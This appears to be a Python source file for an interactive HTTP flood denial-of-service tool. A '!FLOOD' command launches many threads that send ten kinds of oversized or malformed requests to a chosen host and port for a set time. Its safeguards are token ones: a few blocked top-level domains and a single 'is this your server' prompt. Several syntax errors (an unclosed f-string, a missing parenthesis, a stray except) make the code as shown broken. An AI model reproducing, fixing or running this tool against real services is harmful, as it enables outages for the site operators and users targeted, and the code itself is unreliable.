import socket
import threading
import string
import random
import time
import os
import platform
import sys
import select
import logging
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore
import uuid

try:
    from colorama import init
    init()
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

stop_attack = threading.Event()

# Clear screen
def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

# Generate random string
def random_string(length):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

# Generate random User-Agent
def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]
    return random.choice(agents)

# Generate random URL path
def generate_url_path(length):
    return random_string(length)

# Attack logic
def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, max_payload_size=1024):
    if stop_attack.is_set():
        return
    url_path = generate_url_path(10)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        # Generate headers
        headers = [
            f"{type_attack} /{url_path} HTTP/1.1",
            f"Host: {host}",
            f"User-Agent: {random_user_agent()}",
            f"Accept: {random.choice(['text/html', '*/*', 'application/json'])}",
            f"Referer: http://{random_string(10)}.com",
            f"X-Request-ID: {str(uuid.uuid4())}",
            f"Connection: keep-alive",
        ]

        # Payload patterns
        payload_patterns = {
            'BRUTE1': '\n'.join(headers) + f"\nContent-Length: {max_payload_size}\n\n{random_string(max_payload_size)}",
            'BRUTE2': '\n'.join(headers) + f"\n\n\r\r{random_string(500)}\n\n",
            'BRUTE3': '\n'.join(headers) + f"\nX-Custom: {random_string(100)}\n\n",
            'BRUTE4': '\n'.join(headers) + f"\n{b'\x00\x01\xff'.decode('latin1')}\n\n",
            'BRUTE5': '\n'.join(headers) + f"\nContent-Type: text/plain\nContent-Length: 2048\n\n{random_string(2048)}",
            'BRUTE6': '\n'.join(headers) + f"\nX-Invalid: \b\t\r\n{random_string(300)}\n\n",
            'BRUTE7': '\n'.join(headers) + f"\nContent-Length: 0\n\n{random_string(1000)}",
            'BRUTE8': '\n'.join(headers) + f"\nX-Stress: {random_string(2000)}\n\n",
            'BRUTE9': '\n'.join(headers) + f"\n\n{b'\x1f\x8b'.decode('latin1')}{random_string(500)}",
            'BRUTE10': '\n'.join(headers) + f"\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 1500\n\nparam={random_string(1500)}",
        }

        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BRUTE1']).encode('latin1', errors='ignore')
        s.connect((ip, port))
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            logger.debug(f"Sent packet to {ip}:{port} with type {data_type_loader_packet}")
    except Exception as e:
        logger.error(f"Error in DoS_Attack: {e}")
    finally:
        s.close()

def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
    with ThreadPoolExecutor(max_workers=min(spam_loader, 50)) as executor:
        while time.time() < time_loader and not stop_attack.is_set():
            futures = [
                executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet)
                for _ in range(min(spam_loader, 10))
            ]
            for future in futures:
                future.result()
            if stop_attack.is_set():
                break

# Countdown + interrupt
def countdown_timer(time_loader):
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()

        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
            _ = sys.stdin.readline()
            stop_attack.set()
            print(f"\n{Fore.RED}Attack stopped by user{Fore.RESET}")
            return

        time.sleep(1)
        remaining = int(time_loader - time.time())

    if not stop_attack.is_set():
        print(f"\n{Fore.GREEN}Attack completed{Fore.RESET}")
        stop_attack.set()

# Exit confirm
def confirm_exit():
    while True:
        choice = input(f"{Fore.YELLOW}Exit? (y/n): {Fore.RESET}").lower()
        if choice == 'y':
            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            return

# Main command loop
def command():
    global stop_attack
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ").strip()
            if not data_input_loader:
                confirm_exit()
                continue

            args_get = data_input_loader.split()
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 10:
                    data_type_loader_packet = args_get[1].upper()
                    target_loader = args_get[2]
                    port_loader = int(args_get[3])
                    time_loader = time.time() + int(args_get[4])
                    spam_loader = int(args_get[5])
                    create_thread = min(int(args_get[6]), 10)
                    booter_sent = int(args_get[7])
                    methods_loader = args_get[8]
                    spam_create_thread = min(int(args_get[9]), 10)

                    host = ''
                    ip = ''
                    try:
                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                        # Restrict to safe domains for testing
                        if any(x in host.lower() for x in ['.gov', '.mil', '.edu', '.ac']):
                            print(f"{Fore.GREEN}Cannot attack {host} [Restricted domains: .gov, .mil, .edu, .ac]{Fore.RESET}")
                            continue
                        ip = socket.gethostbyname(host)
                        # Verify ownership (example check)
                        if not input(f"{Fore.YELLOW}Confirm this is your server ({host}): (y/n) ").lower() == 'y':
                            print(f"{Fore.RED}Aborted by user{Fore.RESET}")
                            continue
                    except socket.gaierror as e:
                            print(f"{Fore.YELLOW}Failed to resolve host {host}: {e}{Fore.RESET}")
                            continue

                    stop_attack.clear()
                    print(f"{Fore.LIGHTCYAN_EX}Attack started:\n{Fore.YELLOW}Target: {host}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")
                    logger.info(f"Starting attack on {host}:{port_loader} with data_type_loader_packet
                    for _ in range(create_thread):
                        for _ in range(spam_create_thread):
                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet)).start()

                    countdown_thread = threading.Thread(target=countdown_timer, args=(time_loader,)
                    countdown_thread.start()
                    countdown_thread.join()
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> <SPAM_LOADER> <CREATE_thread> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHOD> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHT_EX}Command not found{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            stop_attack.set()
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                print(f"{Fore.RED}Error: {e}{Fore.RESET}")

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
